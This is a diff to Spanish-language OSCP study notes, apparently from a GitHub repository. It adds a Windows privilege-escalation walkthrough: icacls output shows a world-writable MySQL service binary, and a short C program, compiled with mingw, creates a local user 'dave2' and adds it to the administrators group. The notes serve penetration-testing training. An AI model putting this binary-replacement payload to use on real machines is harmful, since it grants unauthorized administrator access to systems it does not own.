@@ -159,13 +159,34 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
   Enumeramos permisos a partir de esta tabla:
 
-    Mask 	  Permissions
-    F 	  Full access
-    M 	  Modify access
-    RX 	  Read and execute access
-    R 	  Read-only access
-    W 	  Write-only access
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/9124d7af-b927-4674-9ee7-a1bc3e0eb0f1)
+
+  Comprobamos los permisos de un binario utilizando el comamndo icacls:
+
+    PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
+    C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Administrators:(F)
+                              BUILTIN\Users:(F)
   
+  Y vemos que todos los usuarios tienen permisos Full (F) sobre este binario.
+
+  Creamos un binario en nuestro Kali para sustituir el binario vulnerable:
+
+    #include <stdlib.h>
+
+    int main ()
+    {
+      int i;
+      
+      i = system ("net user dave2 password123! /add");
+      i = system ("net localgroup administrators dave2 /add");
+      
+      return 0;
+    }
+
+  Lo compilamos:
+
+    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 ## Vulnerabilidades conocidas
 
